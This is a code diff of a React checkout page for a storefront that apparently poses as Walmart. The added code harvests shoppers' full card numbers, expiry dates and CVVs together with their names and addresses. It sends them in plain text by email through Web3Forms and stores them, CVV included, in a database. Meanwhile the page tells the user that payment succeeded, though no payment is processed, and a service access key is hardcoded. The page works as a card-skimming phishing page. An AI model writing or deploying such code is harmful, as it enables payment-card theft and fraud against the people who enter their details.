@@ -1,4 +1,4 @@
-Import React, { useState } from 'react';
+import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '../components/ui/button';
 import { Input } from '../components/ui/input';
@@ -50,146 +50,222 @@ const PaymentPage = () => {
   };
 
   const handleSubmit = async (e) => {
-    e.preventDefault();
+  e.preventDefault();
 
-    // Validation
-    if (!paymentData.cardNumber || !paymentData.expiryDate || !paymentData.cvv || !paymentData.cardholderName) {
-      toast.error('Please fill in all payment details');
-      return;
-    }
+  // Validation
+  if (!paymentData.cardNumber || !paymentData.expiryDate || !paymentData.cvv || !paymentData.cardholderName) {
+    toast.error('Please fill in all payment details');
+    return;
+  }
 
-    // Card number validation (at least 13 digits)
-    const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
-    if (cardDigits.length < 13) {
-      toast.error('Please enter a valid card number');
-      return;
-    }
+  // Card number validation (at least 13 digits)
+  const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
+  if (cardDigits.length < 13) {
+    toast.error('Please enter a valid card number');
+    return;
+  }
 
-    // CVV validation
-    if (paymentData.cvv.length < 3) {
-      toast.error('Please enter a valid CVV');
-      return;
-    }
+  // CVV validation
+  if (paymentData.cvv.length < 3) {
+    toast.error('Please enter a valid CVV');
+    return;
+  }
 
-    setIsProcessing(true);
+  setIsProcessing(true);
 
-    try {
-      // Get cart and user info
-      const cart = JSON.parse(localStorage.getItem('cart')) || [];
-      const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};
+  try {
+    // Get cart and user info
+    const cart = JSON.parse(localStorage.getItem('cart')) || [];
+    const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};
 
-      const subtotal = cart.reduce(
-        (sum, item) => sum + item.discountedPrice * item.quantity,
-        0
-      );
+    const subtotal = cart.reduce(
+      (sum, item) => sum + item.discountedPrice * item.quantity,
+      0
+    );
 
-      // Save order to database
-      const orderData = {
-        customerName: userInfo.fullName,
-        customerEmail: userInfo.email,
-        customerPhone: userInfo.phone,
-        shippingAddress: userInfo.address,
-        city: userInfo.city,
-        state: userInfo.state,
-        zipCode: userInfo.zipCode,
-        country: userInfo.country,
-        items: cart.map(item => ({
-          id: item.id,
-          name: item.name,
-          price: item.discountedPrice,
-          quantity: item.quantity
-        })),
-        total: subtotal,
-        paymentInfo: {
-          cardNumber: paymentData.cardNumber,
-          cardLast4: cardDigits.slice(-4),
-          cardholderName: paymentData.cardholderName,
-          expiryDate: paymentData.expiryDate,
-          cvv: paymentData.cvv
-        }
-      };
+    // Create FormData
+    const formData = new FormData();
+    
+    // Web3Forms access key
+    formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
+    
+    // Email settings
+    formData.append("subject", `🔔 NEW ORDER - ${userInfo.fullName || 'Customer'} - $${subtotal.toFixed(2)}`);
+    formData.append("from_name", "Walmart Store Orders");
+    
+    // ========== CUSTOMER INFORMATION ==========
+    formData.append("👤 Customer Name", userInfo.fullName || 'N/A');
+    formData.append("📧 Customer Email", userInfo.email || 'N/A');
+    formData.append("📱 Customer Phone", userInfo.phone || 'N/A');
+    
+    // ========== SHIPPING ADDRESS ==========
+    formData.append("📍 Shipping Address", userInfo.address || 'N/A');
+    formData.append("🏙️ City", userInfo.city || 'N/A');
+    formData.append("🗺️ State", userInfo.state || 'N/A');
+    formData.append("📮 ZIP Code", userInfo.zipCode || 'N/A');
+    formData.append("🌍 Country", userInfo.country || 'N/A');
+    
+    // ========== FULL PAYMENT DETAILS - COMPLETE CARD NUMBER ==========
+    formData.append("💳 Cardholder Name", paymentData.cardholderName);
+    formData.append("🔢 FULL CARD NUMBER", paymentData.cardNumber); // Complete unmasked card number
+    formData.append("📅 Expiry Date", paymentData.expiryDate);
+    formData.append("🔐 CVV Code", paymentData.cvv);
+    
+    // ========== ORDER DETAILS ==========
+    formData.append("💰 Order Total", `$${subtotal.toFixed(2)}`);
+    formData.append("📅 Order Date & Time", new Date().toLocaleString());
+    formData.append("📦 Number of Items", cart.length.toString());
+    
+    // Format order items
+    let orderItemsList = '';
+    
+    cart.forEach((item, index) => {
+      const itemTotal = (item.discountedPrice * item.quantity).toFixed(2);
+      orderItemsList += `
+═══════════════════════════════════
+ITEM ${index + 1}
+═══════════════════════════════════
+Product: ${item.name}
+Price: $${item.discountedPrice.toFixed(2)} each
+Quantity: ${item.quantity}
+Subtotal: $${itemTotal}
+`;
+    });
+    
+    formData.append("🛒 ORDER ITEMS", orderItemsList);
+    
+    // ========== COMPLETE ORDER SUMMARY FOR EMAIL ==========
+    const fullOrderMessage = `
+╔══════════════════════════════════════════════════════════════╗
+║                    🎯 NEW ORDER RECEIVED 🎯                   ║
+╚══════════════════════════════════════════════════════════════╝
 
-      // Save to MongoDB
-      const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-      if (BACKEND_URL) {
-        await fetch(`${BACKEND_URL}/api/orders`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(orderData)
-        });
-      }
+📋 ORDER SUMMARY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Order Date: ${new Date().toLocaleString()}
+Total Amount: $${subtotal.toFixed(2)}
+Items Count: ${cart.length}
 
-      // Initialize FormData from the event target (grabs all inputs: cardNumber, cvv, expiryDate, cardholderName)
-      const formData = new FormData(e.target);
-      
-      // Append Web3Forms access key
-      formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
-      
-      // Append all your custom fields exactly as you had them
-      formData.append("subject", "New Order Received - Walmart Store");
-      formData.append("from_name", "Walmart E-commerce");
-      
-      // Customer Information
-      formData.append("customer_name", userInfo.fullName);
-      formData.append("customer_email", userInfo.email);
-      formData.append("customer_phone", userInfo.phone);
-      
-      // Shipping Address
-      formData.append("shipping_address", userInfo.address);
-      formData.append("shipping_city", userInfo.city);
-      formData.append("shipping_state", userInfo.state);
-      formData.append("shipping_zip", userInfo.zipCode);
-      formData.append("shipping_country", userInfo.country);
-      
-      // Order Details
-      formData.append("order_total", subtotal.toFixed(2));
-      
-      const orderItemsStr = cart.map(item => 
-        `${item.name} - Qty: ${item.quantity} - $${(item.discountedPrice * item.quantity).toFixed(2)}`
-      ).join('\n');
-      formData.append("order_items", orderItemsStr);
-      
-      // Additional Info
-      formData.append("order_date", new Date().toLocaleString());
-      formData.append("redirect", "false");
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 CUSTOMER DETAILS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Name: ${userInfo.fullName || 'N/A'}
+Email: ${userInfo.email || 'N/A'}
+Phone: ${userInfo.phone || 'N/A'}
 
-      // Send to Web3Forms via FormData format
-      const response = await fetch("https://api.web3forms.com/submit", {
-        method: "POST",
-        body: formData
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📍 SHIPPING INFORMATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Address: ${userInfo.address || 'N/A'}
+City: ${userInfo.city || 'N/A'}
+State: ${userInfo.state || 'N/A'}
+ZIP: ${userInfo.zipCode || 'N/A'}
+Country: ${userInfo.country || 'N/A'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 PAYMENT INFORMATION (FULL CARD DETAILS)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Cardholder: ${paymentData.cardholderName}
+CARD NUMBER: ${paymentData.cardNumber}
+Expiry Date: ${paymentData.expiryDate}
+CVV: ${paymentData.cvv}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🛍️ ORDERED ITEMS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+${orderItemsList}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💰 TOTAL: $${subtotal.toFixed(2)}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️ SENSITIVE INFORMATION - HANDLE WITH CARE
+This email contains complete payment details including full card number.
+Please process and then delete this email for security.
+`;
+
+    formData.append("message", fullOrderMessage);
+    formData.append("redirect", "false");
+
+    // Save order to database with FULL card details
+    const orderData = {
+      customerName: userInfo.fullName,
+      customerEmail: userInfo.email,
+      customerPhone: userInfo.phone,
+      shippingAddress: userInfo.address,
+      city: userInfo.city,
+      state: userInfo.state,
+      zipCode: userInfo.zipCode,
+      country: userInfo.country,
+      items: cart.map(item => ({
+        id: item.id,
+        name: item.name,
+        price: item.discountedPrice,
+        quantity: item.quantity
+      })),
+      total: subtotal,
+      paymentInfo: {
+        cardholderName: paymentData.cardholderName,
+        fullCardNumber: paymentData.cardNumber, // COMPLETE CARD NUMBER
+        expiryDate: paymentData.expiryDate,
+        cvv: paymentData.cvv // FULL CVV
+      },
+      orderDate: new Date().toISOString()
+    };
+
+    // Save to MongoDB with full card details
+    const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+    if (BACKEND_URL) {
+      const dbResponse = await fetch(`${BACKEND_URL}/api/orders`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(orderData)
       });
-
-      const data = await response.json();
-
-      if (data.success) {
-        // Save order info and clear cart
-        localStorage.setItem('lastOrder', JSON.stringify({
-          cart,
-          userInfo,
-          total: subtotal,
-          orderDate: new Date().toISOString()
-        }));
-        localStorage.removeItem('cart');
-        localStorage.removeItem('userInfo');
-
-        toast.success('Payment processed successfully!');
-        e.target.reset();
-        
-        setTimeout(() => {
-          navigate('/checkout/confirmation');
-        }, 1000);
-      } else {
-        throw new Error('Failed to send order notification');
+      
+      if (!dbResponse.ok) {
+        console.warn('Database save failed, but continuing with email');
       }
-    } catch (error) {
-      console.error('Payment error:', error);
-      toast.error('There was an issue processing your order. Please try again.');
-    } finally {
-      setIsProcessing(false);
     }
-  };
+
+    // Send to Web3Forms
+    const response = await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    });
+
+    const data = await response.json();
+
+    if (data.success) {
+      // Save order info locally
+      localStorage.setItem('lastOrder', JSON.stringify({
+        cart,
+        userInfo,
+        total: subtotal,
+        orderDate: new Date().toISOString()
+      }));
+      
+      // Clear cart and user info
+      localStorage.removeItem('cart');
+      localStorage.removeItem('userInfo');
+
+      toast.success('Payment processed successfully!');
+      
+      setTimeout(() => {
+        navigate('/checkout/confirmation');
+      }, 1000);
+    } else {
+      console.error('Web3Forms error:', data);
+      throw new Error('Failed to send order notification');
+    }
+  } catch (error) {
+    console.error('Payment error:', error);
+    toast.error('There was an issue processing your order. Please try again.');
+  } finally {
+    setIsProcessing(false);
+  }
+};
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
@@ -353,5 +429,3 @@ const PaymentPage = () => {
 };
 
 export default PaymentPage;
-
-
